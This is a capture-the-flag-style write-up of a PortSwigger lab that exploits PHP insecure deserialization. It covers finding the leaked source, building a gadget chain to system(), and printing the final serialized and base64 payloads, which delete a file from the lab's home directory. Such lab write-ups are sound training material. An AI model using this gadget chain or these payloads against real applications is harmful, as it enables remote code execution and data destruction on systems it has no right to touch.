[Insecure deserialization](../Insecure%20deserialization.md)
# Description

This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its [insecure deserialization](https://portswigger.net/web-security/deserialization) to achieve remote code execution. To solve the lab, delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

# Solution
## Enum

In html source code 
```html
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
```

We can examine the content of file **CustomTemplate.php** using tilda sign `~` (backup of file)

CustomTemplate.php
```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
```

now we can try to construct our chain of gadgets

## Creating gadget chain

the most usefull line of code is `call_user_func($this->callback, $name)`, using this function we can execute any function with any parameters we want

example of usage
![](Attachments/Pasted%20image%2020240528040632.png)

So we need to somehow force the code to execute `system('rm /home/carlos/morale.txt')`.

```php
public function __get($name) {
	return call_user_func($this->callback, $name);
}
```
This function is called  when we try to get some attribute in DefaultMap class

```php
$default_map = new DefaultMap();
$default_map->some_attribute;
```

In this example  `__get($name)` $name will equal to "some_attribute". 

We can try to get attribute of DefaultMap in Product class
```php
class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}
```

`$desc` must equal DefaultMap object, and `$default_desc_type` must equal `"rm /home/carlos/morale.txt"`

In CustomTemplate class
```php
public function __wakeup() {
	$this->build_product();
}

private function build_product() {
	$this->product = new Product($this->default_desc_type, $this->desc);
}
```

`__wakeup()` magic method is executed when object is deserialized, 
then `build_product()` is called.
In serialized CustomTemplate class we can assign `$this->default_desc_type, $this->desc` to our mallicious values.

## Final script

```php
<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        // $this->desc = new Description();
        // $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        // $this->build_product();
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback='system') {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}


$custom_template = new CustomTemplate();
$custom_template->desc = new DefaultMap();
$custom_template->desc->callback = "system";
$custom_template->default_desc_type = "rm /home/carlos/morale.txt";

 

$serialized = serialize($custom_template);
echo $serialized;
```

![](Attachments/Pasted%20image%2020240528042134.png)

## Warning

In first attempts my payload did't work because of `DefaultMapcallback`

![](Attachments/Pasted%20image%2020240528042243.png)

I think that was suspicious and in my chain.php i changed code in DefaultMap and made `$callback` publicly available and manually assigned `$callback` to "system". That worked

## Final Payload

```php
O:14:"CustomTemplate":3:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}s:7:"product";N;}
```

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjM6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjY6InN5c3RlbSI7fXM6NzoicHJvZHVjdCI7Tjt9
```
